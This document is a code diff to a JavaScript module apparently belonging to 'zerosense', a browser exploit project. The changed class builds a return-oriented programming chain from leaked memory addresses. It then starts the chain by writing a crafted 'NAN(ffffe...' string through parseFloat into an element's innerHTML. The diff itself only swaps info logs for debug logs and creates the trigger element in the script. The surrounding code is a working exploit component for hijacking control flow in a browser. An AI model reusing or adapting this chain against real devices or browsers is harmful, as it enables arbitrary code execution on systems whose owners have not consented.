@@ -2,6 +2,8 @@
 
 var Util = require('zerosense/Util');
 
+var trigger = document.body.appendChild(document.createElement("div"));
+
 class Chain {
 	
 	constructor(cb) {
@@ -63,14 +65,14 @@ class Chain {
 		if (addrData === null) {
 			throw new Error("Failed to get chain data address.");
 		}
-		logger.info(`Found chain data at 0x${addrData.toString(16)}`);
+		logger.debug(`Found chain data at 0x${addrData.toString(16)}`);
 		this.cb.updateDataAddress(addrData);
 		
 		var addrStack = arrayLeaker.setAndGetAddress(i++, this.cb.getChain());
 		if (addrStack === null) {
 			throw new Error("Failed to get chain stack address.");
 		}
-		logger.info(`Found chain stack at 0x${addrStack.toString(16)}`);
+		logger.debug(`Found chain stack at 0x${addrStack.toString(16)}`);
 		var chainStackOffset = 0x4;
 		
 		var setup2 = this.setup2Make(addrStack + chainStackOffset);
@@ -78,17 +80,17 @@ class Chain {
 		if (addrSetup2 === null) {
 			throw new Error("Failed to get setup2 address.");
 		}
-		logger.info(`Found setup2 at 0x${addrSetup2.toString(16)}`);
+		logger.debug(`Found setup2 at 0x${addrSetup2.toString(16)}`);
 		
 		var setup1 = this.setup1Make(addrSetup2);
 		var addrSetup1 = arrayLeaker.setAndGetAddress(i++, setup1);
 		if (addrSetup1 === null) {
 			throw new Error("Failed to get setup1 address.");
 		}
-		logger.info(`Found setup1 at 0x${addrSetup1.toString(16)}`);
+		logger.debug(`Found setup1 at 0x${addrSetup1.toString(16)}`);
 		
 		this.addrChainStart = addrSetup1;
-		logger.info(`Chain start at 0x${this.addrChainStart.toString(16)}`);
+		logger.debug(`Chain start at 0x${this.addrChainStart.toString(16)}`);
 	}
 	
 	execute() {
@@ -96,8 +98,8 @@ class Chain {
 			throw new Error("addrChainStart is null");
 		}
 		
-		logger.info(`Starting chain at 0x${this.addrChainStart.toString(16)}`);
-		document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
+		logger.debug(`Starting chain at 0x${this.addrChainStart.toString(16)}`);
+		trigger.innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
 	}
 	
 }
